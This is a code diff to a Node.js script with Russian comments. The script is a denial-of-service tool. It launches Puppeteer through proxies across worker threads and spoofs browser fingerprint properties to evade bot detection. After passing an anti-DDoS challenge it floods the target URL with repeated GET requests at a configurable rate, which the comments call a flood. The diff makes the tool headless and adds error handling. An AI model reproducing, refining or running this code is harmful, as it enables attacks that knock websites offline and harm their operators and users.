@@ -4,13 +4,14 @@ const axios = require('axios');
 const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 
-// Генерация случайных User-Agent
+// Указываем явный путь к Chrome/Chromium
+const CHROME_PATH = '/usr/bin/google-chrome'; // Для Linux. Для Windows: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
+
+// Генерация User-Agent
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/118.0'
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
 ];
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
@@ -35,36 +36,40 @@ if (isMainThread) {
 
     (async () => {
         const browser = await puppeteer.launch({
-            headless: false,
+            executablePath: CHROME_PATH,
+            headless: true,
             args: [
                 `--proxy-server=${proxy}`,
-                '--disable-web-security',
-                '--disable-features=IsolateOrigins,site-per-process',
-                '--no-sandbox'
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--disable-gpu'
             ]
         });
 
         const page = await browser.newPage();
         await page.setUserAgent(getRandomUserAgent());
 
-        // Подмена фингерпринта
+        // Обход детектов
         await page.evaluateOnNewDocument(() => {
             Object.defineProperty(navigator, 'webdriver', { get: () => false });
             Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
-            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
         });
 
-        // Имитация поведения
-        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 60000 });
-        await page.mouse.move(100, 100);
-        await page.mouse.click(100, 100);
-
-        // Флуд после прохождения UAM
-        setInterval(() => {
-            axios.get(targetUrl, {
-                proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
-                headers: { 'User-Agent': getRandomUserAgent() }
-            }).catch(() => {});
-        }, 1000 / rate);
+        try {
+            await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+            
+            // Флуд после успешного входа
+            setInterval(() => {
+                axios.get(targetUrl, {
+                    proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
+                    headers: { 'User-Agent': getRandomUserAgent() }
+                }).catch(() => {});
+            }, 1000 / rate);
+        } catch (err) {
+            console.error(`Ошибка в потоке: ${err.message}`);
+            await browser.close();
+        }
     })();
 }
